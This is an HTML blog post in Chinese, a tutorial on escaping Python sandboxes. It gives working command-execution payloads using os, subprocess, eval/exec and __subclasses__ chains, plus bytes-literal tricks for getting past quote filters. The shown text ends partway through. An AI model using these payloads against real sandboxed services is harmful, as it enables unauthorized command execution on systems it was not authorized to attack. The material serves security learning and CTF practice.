@@ -1,0 +1,328 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>扶摇·九-python沙盒逃逸初探 | 拂云观 · legend1440</title><meta name="author" content="legend1440"><meta name="copyright" content="legend1440"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="漏洞利用沙盒是一个限制代码执行环境的机制，比如：  禁止导入某些危险模块（os, subprocess）  删除危险内置函数（import, open）  限制全局&#x2F;局部变量访问   逃逸 &#x3D; 突破这些限制，执行系统命令或读取任意文件 python的逃逸链实际上我们早就接触过，很多就是ssti的利用链，像这样 1exec(&#x27;&quot;&quot;.__class__">
+<meta property="og:type" content="article">
+<meta property="og:title" content="扶摇·九-python沙盒逃逸初探">
+<meta property="og:url" content="http://hnu-legend1440.com/2026/04/29/%E6%89%B6%E6%91%87%C2%B7%E4%B9%9D-python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="拂云观 · legend1440">
+<meta property="og:description" content="漏洞利用沙盒是一个限制代码执行环境的机制，比如：  禁止导入某些危险模块（os, subprocess）  删除危险内置函数（import, open）  限制全局&#x2F;局部变量访问   逃逸 &#x3D; 突破这些限制，执行系统命令或读取任意文件 python的逃逸链实际上我们早就接触过，很多就是ssti的利用链，像这样 1exec(&#x27;&quot;&quot;.__class__">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hnu-legend1440.com/img/lanqiao.png">
+<meta property="article:published_time" content="2026-04-29T07:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-16T12:42:41.201Z">
+<meta property="article:author" content="legend1440">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hnu-legend1440.com/img/lanqiao.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "扶摇·九-python沙盒逃逸初探",
+  "url": "http://hnu-legend1440.com/2026/04/29/%E6%89%B6%E6%91%87%C2%B7%E4%B9%9D-python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/",
+  "image": "http://hnu-legend1440.com/img/lanqiao.png",
+  "datePublished": "2026-04-29T07:00:00.000Z",
+  "dateModified": "2026-07-16T12:42:41.201Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "legend1440",
+      "url": "http://hnu-legend1440.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/sign.ico"><link rel="canonical" href="http://hnu-legend1440.com/2026/04/29/%E6%89%B6%E6%91%87%C2%B7%E4%B9%9D-python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.6.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '扶摇·九-python沙盒逃逸初探',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><!-- hexo injector head_end start --><link rel="stylesheet" href="/Blog-Like/style.css">
+<script src="/Blog-Like/Blog-Like.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.1"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/webbg.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://q.qlogo.cn/headimg_dl?dst_uin=1535548287&amp;spec=640&amp;img_type=jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/training/"><i class="fa-fw fa fa-yin-yang"></i><span> 知识修行</span></a></div><div class="menus_item"><a class="site-page" href="/categories/WP/"><i class="fa-fw fa fa-feather"></i><span> 实战概况</span></a></div><div class="menus_item"><a class="site-page" href="/categories/puzzles/"><i class="fa-fw fa fa-spa"></i><span> 复现札记</span></a></div><div class="menus_item"><a class="site-page" href="/categories/server/"><i class="fa-fw fa fa-wifi"></i><span> 内网渗透</span></a></div><div class="menus_item"><a class="site-page" href="/categories/schedule/"><i class="fa-fw far fa-bell"></i><span> 期末突击</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/lanqiao.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">拂云观 · legend1440</span></a><a class="nav-page-title" href="/"><span class="site-name">扶摇·九-python沙盒逃逸初探</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/training/"><i class="fa-fw fa fa-yin-yang"></i><span> 知识修行</span></a></div><div class="menus_item"><a class="site-page" href="/categories/WP/"><i class="fa-fw fa fa-feather"></i><span> 实战概况</span></a></div><div class="menus_item"><a class="site-page" href="/categories/puzzles/"><i class="fa-fw fa fa-spa"></i><span> 复现札记</span></a></div><div class="menus_item"><a class="site-page" href="/categories/server/"><i class="fa-fw fa fa-wifi"></i><span> 内网渗透</span></a></div><div class="menus_item"><a class="site-page" href="/categories/schedule/"><i class="fa-fw far fa-bell"></i><span> 期末突击</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">扶摇·九-python沙盒逃逸初探</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-29T07:00:00.000Z" title="发表于 2026-04-29 15:00:00">2026-04-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-16T12:42:41.201Z" title="更新于 2026-07-16 20:42:41">2026-07-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/training/">-training</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>沙盒是一个限制代码执行环境的机制，比如：</p>
+<ul>
+<li><p>禁止导入某些危险模块（<code>os</code>, <code>subprocess</code>）</p>
+</li>
+<li><p>删除危险内置函数（<code>import</code>, <code>open</code>）</p>
+</li>
+<li><p>限制全局&#x2F;局部变量访问</p>
+</li>
+</ul>
+<p>逃逸 &#x3D; 突破这些限制，执行系统命令或读取任意文件</p>
+<p>python的逃逸链实际上我们早就接触过，很多就是ssti的利用链，像这样</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">exec</span>(<span class="string">&#x27;&quot;&quot;.__class__.__mro__[1].__subclasses__()&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>因为python万物皆对象，我们根本不用既有的对象，都能爬到 <code>object</code>，然后往下找到所有类。</p>
+<p>python沙盒逃逸&#x3D;<strong>命令执行+代码操作</strong></p>
+<p>我们必须利用 Python 的动态特性，通过各种方式间接访问 <code>import</code> 函数，然后用它来导入 <code>os</code> 模块，最终执行系统命令。</p>
+<h2 id="常见的命令执行语句"><a href="#常见的命令执行语句" class="headerlink" title="常见的命令执行语句"></a>常见的命令执行语句</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">----os----</span><br><span class="line">os.system(<span class="string">&quot;dir&quot;</span>) <span class="comment">#自动打印</span></span><br><span class="line">os.popen(<span class="string">&quot;dir&quot;</span>).read() <span class="comment">#需要打印，read()</span></span><br><span class="line">￥￥￥枚举￥￥￥</span><br><span class="line">os.listdir(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span></span><br><span class="line">(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">---subprocess---</span><br><span class="line">subprocess.call(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.run(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen([<span class="string">&quot;dir&quot;</span>], shell=<span class="literal">True</span>)</span><br><span class="line">---sys----</span><br><span class="line">sys.modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">sys.modules[<span class="string">&quot;os&quot;</span>].popen(<span class="string">&quot;dir&quot;</span>).read()</span><br><span class="line">---importlib---</span><br><span class="line">importlib.import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">importlib.import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;dir&quot;</span>) <span class="comment">#同样可以引入其他模块</span></span><br><span class="line">...</span><br><span class="line">---imp---</span><br><span class="line">imp.load_source(<span class="string">&quot;os&quot;</span>,<span class="string">&quot;/usr/lib/python3.8/os.py&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">imp.os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">imp.sys.modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">---platform---</span><br><span class="line">platform.os.system(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">platform.sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">%%%% Python2 %%%%</span><br><span class="line"><span class="comment">#在Python 2中，commands模块提供了一些函数来执行外部命令。虽然在Python 3中已被弃用</span></span><br><span class="line">commands.getstatusoutput(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">commands.getoutput(<span class="string">&quot;dir&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>importlib</code> 是 Python 3 中引入的一个模块，它提供了一个 API，用于动态地导入模块。这意味着你可以在运行时根据需要加载模块，而不是在程序启动时就加载所有模块。（具体可以看文档了解一下）</p>
+</li>
+<li><p><code>imp</code> 库是 Python 中一个用于动态导入模块的工具。它提供了一些函数，可以用于查找、加载和重新加载模块。虽然在 Python 3.4 之后，<code>imp</code> 库已经被 <code>importlib</code> 库所取代</p>
+</li>
+</ul>
+<h2 id="eval操作"><a href="#eval操作" class="headerlink" title="eval操作"></a>eval操作</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="exec操作"><a href="#exec操作" class="headerlink" title="exec操作"></a>exec操作</h2><p>相比之下, exec 允许 \n 和 ； 进行换行,但是eval不行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;); </span></span><br><span class="line"><span class="string">__import__</span></span><br><span class="line"><span class="string">(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>)    <span class="comment">#✔ ✔ ✔ ✔ ✔</span></span><br><span class="line"> <span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;)\n__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>)</span><br><span class="line"> <span class="built_in">eval</span>(<span class="string">&#x27;print(&#x27;</span>RCE<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">__import__</span></span><br><span class="line"><span class="string">(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)不行</span><br><span class="line">你得用</span><br><span class="line"> <span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h2><p>和nodejs的沙箱一样吧，就是给你个运行代码的沙盒，看你能不能利用这个沙盒来做到RCE</p>
+<p>但python我们有很多原生类可以直接调用，不需要用到nodejs中的”沙盒对象”或者模块对象等等</p>
+<p>例如我们让沙盒执行这一段小小的代码，它就能进行RCE了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls /&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MzllYjc5Y2NmZWZmZDdhNDNkOGNmNTFiNzM1NzA4ZTBfMmExYjMyOTE3MWExNDRkZTc3NDI4ZjAzYzY2ZmUzNDZfSUQ6NzYzMjM0MzIwMzg1NDI1NzM0Nl8xNzg0MjA1NjQ0OjE3ODQyOTIwNDRfVjM" alt="Image"></p>
+<p>一些ssti的payload能直接拿过来抄，因为ssti本质也挺像沙盒的</p>
+<p>但一般的沙盒逃逸没法用中括号[‘’]来代替点号，也没有config，也不太建议使用</p>
+<p>如果换个类，subprocess，也一样，但要注意引入subprocess</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.call(<span class="string">&quot;ls /&quot;</span>,shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjY1N2NjMDMwNDFjODZmYWVkMzM3Mjk5MWYwMTg4NDVfZjljZWUzM2RlNzBkZTFhNTU2MmFiMmUxMWU1NThmNzFfSUQ6NzYzMjM0Nzk4MTIzNjM0MTcwMF8xNzg0MjA1NjQ0OjE3ODQyOTIwNDRfVjM" alt="Image"></p>
+<h2 id="import语句"><a href="#import语句" class="headerlink" title="import语句"></a>import语句</h2><p>两行可以合并成一行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).call(<span class="string">&quot;ls /&quot;</span>,shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YWU0NDc2MGZiZjQxMjkzNDZiZGY5NTgwMmZjZDBiNzNfNDI2YWExYjM1MjBiM2JmMzViZGY2MzI2YzBiNjAxMjhfSUQ6NzYzMjM0ODYxMTI1ODUxODc1M18xNzg0MjA1NjQ0OjE3ODQyOTIwNDRfVjM" alt="Image"></p>
+<h2 id="类中方法-eval-import没了"><a href="#类中方法-eval-import没了" class="headerlink" title="类中方法(eval&#x2F;import没了)"></a>类中方法(eval&#x2F;import没了)</h2><p>如果eval没了，你就只能拿类中方法了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()</span><br><span class="line">[].__class__.__base__.__subclasses__()</span><br><span class="line">&#123;&#125;.__class__.__base__.__subclasses__()</span><br><span class="line">().__class__.__base__.__subclasses__()</span><br><span class="line">(<span class="number">1</span>).__class__.__base__.__subclasses__()</span><br><span class="line"><span class="built_in">bool</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="built_in">print</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="built_in">open</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__class__&quot;</span>).mro()[<span class="number">1</span>].__subclasses__()</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__class__&quot;</span>).__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p>可以用一下脚本找到第几个是你要的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>([i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>([].__class__.__base__.__subclasses__()) <span class="keyword">if</span> <span class="built_in">hasattr</span>(c, <span class="string">&#x27;__init__&#x27;</span>) <span class="keyword">and</span> <span class="built_in">hasattr</span>(c.__init__, <span class="string">&#x27;__globals__&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> c.__init__.__globals__])</span><br></pre></td></tr></table></figure>
+
+<p>142</p>
+<p><img src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YWFiZDJlMzhhNzk4ODk2NmU2NWQ4MzljNDE1Nzc4ZmZfMzgwODZiZWUwMTlkYjZkYWY3YjNkZmJhNjMxZmE0YjNfSUQ6NzYzMjM2MDU4OTg3NjEyMDc1N18xNzg0MjA1NjQ0OjE3ODQyOTIwNDRfVjM" alt="Image"></p>
+<p>然后</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">142</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>正常执行</p>
+<p><img src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTlkZDU2M2FhMjBlMzRhNTExOTlkMWJmYjhiOWU3OTRfOTI0MjNhYzA0NTVmYTQ0MzQ4MjBhNTk5OGQ0OGY4ZmFfSUQ6NzYzMjM2MTAzMDQ3MTAyNzkyMl8xNzg0MjA1NjQ0OjE3ODQyOTIwNDRfVjM" alt="Image"></p>
+<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>).read()</span><br><span class="line"><span class="keyword">import</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span class="string">&#x27;example.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h1><h2 id="byte利用"><a href="#byte利用" class="headerlink" title="byte利用"></a>byte利用</h2><h3 id="绕过引号禁用"><a href="#绕过引号禁用" class="headerlink" title="绕过引号禁用"></a>绕过引号禁用</h3><p>当引号被禁用（不能写 <code>&#39;system&#39;</code> 或 <code>&quot;system&quot;</code>）时，用 <code>bytes</code> 类型的字符串字面量来生成任意字符。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正常写法（引号被禁时不能用）</span></span><br><span class="line"><span class="string">&#x27;system&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bytes 写法（不需要引号）</span></span><br><span class="line"><span class="string">b&#x27;system&#x27;</span>           <span class="comment"># bytes 字面量</span></span><br><span class="line"><span class="string">b&#x27;system&#x27;</span>.decode()  <span class="comment"># 解码成 str → &#x27;system&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Try:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">b&#x27;__import__(&quot;subprocess&quot;).call(&quot;ls /&quot;,shell=True)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>能够成功</p>
+<p>再Try:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">b&#x27;__import__(b&quot;subprocess&quot;).call(b&quot;ls /&quot;,shell=True)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可见import的参数不能是比特</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  File &quot;/app/run.py&quot;, line <span class="number">1</span>, <span class="keyword">in</span> <span class="operator">&lt;</span><span class="keyword">module</span><span class="operator">&gt;</span></span><br><span class="line">    eval(b<span class="string">&#x27;__import__(b&quot;subprocess&quot;).call(b&quot;ls /&quot;,shell=True)&#x27;</span>)</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line <span class="number">1</span>, <span class="keyword">in</span> <span class="operator">&lt;</span><span class="keyword">module</span><span class="operator">&gt;</span></span><br><span class="line">TypeError: __import__() argument <span class="number">1</span> must be str, <span class="keyword">not</span> bytes</span><br></pre></td></tr></table></figure>
+
+<p>如果换成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">b&#x27;__import__(b&quot;subprocess&quot;.decode()).call(b&quot;ls /&quot;,shell=True)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>还算能正常运行</p>
+<p><img src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ODc2NGNjMmRiMmI3OWMyNDAxYTc5ODJjM2I3ZDllYWNfYTJhMTQ2MmE0MjQxZjA0NDZiNDc0MWQ1NTdiMGMwMmRfSUQ6NzYzMjM1NDM3OTY4MDY0ODEzN18xNzg0MjA1NjQ0OjE3ODQyOTIwNDRfVjM" alt="Image"></p>
+<h3 id="十六进制表示"><a href="#十六进制表示" class="headerlink" title="十六进制表示"></a>十六进制表示</h3><p>如果连 <code>b&#39;</code> 里的引号也被禁，就用十六进制：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 十六进制构造 bytes</span></span><br><span class="line"><span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>])  <span class="comment"># 115=&#x27;s&#x27;, 121=&#x27;y&#x27;...</span></span><br><span class="line"><span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()  <span class="comment"># &#x27;system&#x27;</span></span><br></pre></td></tr></table></figure>
+
